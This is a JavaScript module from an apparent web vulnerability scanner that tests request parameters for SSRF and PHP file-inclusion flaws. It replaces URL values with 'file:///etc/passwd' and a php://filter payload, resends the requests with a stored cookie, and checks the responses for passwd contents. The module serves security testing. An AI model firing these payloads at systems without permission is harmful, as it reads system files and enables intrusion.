'use strict'
const RequestParser=require("../core/RequestParser.js")
const ResponseParser=require("../core/ResponseParser.js")
const { default: axios } = require("axios")

const {store_cookie} = require("../core/WebSpider.js")
// var response = await axios({
//     url:req.url,
//     method:req.request.request_line.method,
//     data:req.data,
//     timeout:0,
//     headers:{
//       "Cookie":store_cookie[0]
//     },
// })
async function Check(req=new RequestParser("http://127.0.0.1")){
    var keyword=new URL(req.url).searchParams.toString()+req.request.data;
    // if(req.url.includes("/vul/ssrf/"))
    //     console.log(req.url,keyword.match(/=http[s]{0,1}/)===null,keyword)
    if(keyword.match(/=http[s]{0,1}/)===null)
        return [false]
   
    var playload="file:///etc/passwd"
    var playload2="php://filter/read=convert.base64-encode/resource=file:///etc/passwd"
    var check2="cm9vdDp4"
    var result=[]
    var url=req.url.replace(/=http[s]{0,1}[^&]+/,"="+playload).replace("__DefaultValue__",playload)
    var data=req.request.data.replace(/=http[s]{0,1}[^&]+/,"="+playload).replace("__DefaultValue__",playload)
    try{
       //SSRF 检测
       //  SSRF 发起请求，并返回
       {
        let response=  await axios({
            url:url,
            method:req.request.request_line.method,
            data:data,
            timeout:0,
            headers:{
                "Cookie":store_cookie[0]
            },
        })

       // console.log(url,"----------",response.data.includes("root:x:"))
        if(response.data.includes("root:x:")){//有回显
            result.push([`该url ${url}，直接让服务器发起远程请求到${playload}并渲染响应数据`,""])
        }else{//无回显
            result.push(["请求参数可能无回显，需进一步测试",""])
        }
       
       }
       //文件包含 SSRF  //感觉没有这种场景
       {
        if(result.length===0){
            url=req.url.replace(/=http[s]{0,1}[^&]+/,"="+playload2).replace("__DefaultValue__",playload2)
            data=req.request.data.replace(/=http[s]{0,1}[^&]+/,"="+playload2).replace("__DefaultValue__",playload2)       
            let response1=  await axios({
                url:url,
                method:req.request.request_line.method,
                data:data,
                timeout:0,
                headers:{
                    "Cookie":store_cookie[0]
                },
            })
        
            if(response1.data.includes(check2)){
                result.push([`该url ${url}，让服务器以读取文件的方式请求链接`,""])
            }else{
                result.push(["请求参数可能无回显，需进一步测试",""])
            }
            }
        }
      
     
    }catch(e){
        console.log("SSRF",e)
    }

   
    if(result.length!==0)
        return [true].concat(result)
    else
        return [false]
    // 对于数组中的元素，第一个是触发方法，第二个是修复意见，如果没有的话就用默认的代替,可以接多个数组

}

module.exports=Check






